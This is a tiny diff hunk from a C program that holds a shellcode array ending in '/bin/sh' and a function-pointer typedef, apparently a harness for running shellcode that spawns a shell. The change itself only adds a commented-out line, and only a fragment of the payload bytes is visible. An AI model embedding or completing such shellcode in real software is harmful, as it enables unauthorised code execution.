@@ -4,6 +4,7 @@ char shellcode[] =
 	"\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
 typedef void (*F)();
+/*typedef void (*F)(); */
 
 main()
 {
